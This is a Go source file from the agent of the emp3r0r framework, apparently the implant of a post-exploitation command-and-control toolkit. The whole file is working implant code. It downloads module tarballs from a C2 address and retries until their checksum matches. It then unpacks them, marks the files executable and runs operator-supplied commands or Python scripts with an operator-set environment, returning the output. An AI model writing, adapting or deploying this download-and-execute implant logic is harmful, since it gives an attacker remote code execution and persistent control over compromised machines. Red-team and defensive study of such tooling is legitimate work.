package agent

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// moduleHandler downloads and runs modules from C2
// env: in format "VAR1=VALUE1,VAR2=VALUE2"
func moduleHandler(download_addr, modName, checksum, exec_cmd string, env []string, inMem bool) (out string) {
	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)

	// download and extract module file
	if !inMem {
		if downloadErr := downloadAndVerifyModule(tarball, checksum, download_addr); downloadErr != nil {
			return downloadErr.Error()
		}

		if extractErr := extractModule(modDir, tarball); extractErr != nil {
			return extractErr.Error()
		}
	}

	// cd to module dir
	defer os.Chdir(RuntimeConfig.AgentRoot)
	err := os.Chdir(modDir)
	if err != nil {
		return fmt.Sprintf("cd to %s: %v", modDir, err)
	}

	// construct command
	fields := strings.Fields(exec_cmd)
	if len(fields) == 0 {
		return fmt.Sprintf("empty exec_cmd: %s (env: %v)", strconv.Quote(exec_cmd), env)
	}
	executable := fields[0]
	args := []string{}
	if strings.HasSuffix(fields[0], ".py") {
		executable = "python"
		args = []string{exec_cmd}
	} else {
		args = fields[1:]
	}
	cmd := exec.Command(executable, args...)
	cmd.Env = env
	log.Printf("Running %v (%v)", cmd.Args, cmd.Env)
	outBytes, err := cmd.CombinedOutput()
	out = string(outBytes)
	if err != nil {
		return fmt.Sprintf("running %s: %s (%v)", strconv.Quote(exec_cmd), out, err)
	}

	return out
}

func getScriptExtension() string {
	if runtime.GOOS == "windows" {
		return "ps1"
	}
	return "sh"
}

func downloadAndVerifyModule(tarball, checksum, download_addr string) error {
	if tun.SHA256SumFile(tarball) != checksum {
		if _, err := SmartDownload(download_addr, util.FileBaseName(tarball), tarball, checksum); err != nil {
			return err
		}
	}

	if tun.SHA256SumFile(tarball) != checksum {
		log.Print("Checksum failed, restarting...")
		util.TakeABlink()
		os.RemoveAll(tarball)
		return downloadAndVerifyModule(tarball, checksum, download_addr) // Recursive call
	}
	return nil
}

func extractModule(modDir, tarball string) error {
	os.RemoveAll(modDir)
	if err := util.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
		return fmt.Errorf("unarchive module tarball: %v", err)
	}

	return processModuleFiles(modDir)
}

func processModuleFiles(modDir string) error {
	files, err := os.ReadDir(modDir)
	if err != nil {
		return fmt.Errorf("processing module files: %v", err)
	}

	for _, f := range files {
		if err := os.Chmod(filepath.Join(modDir, f.Name()), 0o700); err != nil {
			return fmt.Errorf("setting permissions for %s: %v", f.Name(), err)
		}

		libsTarball := filepath.Join(modDir, "libs.tar.xz")
		if util.IsExist(libsTarball) {
			os.RemoveAll(filepath.Join(modDir, "libs"))
			if err := util.Unarchive(libsTarball, modDir); err != nil {
				return fmt.Errorf("unarchive %s: %v", libsTarball, err)
			}
		}
	}
	return nil
}
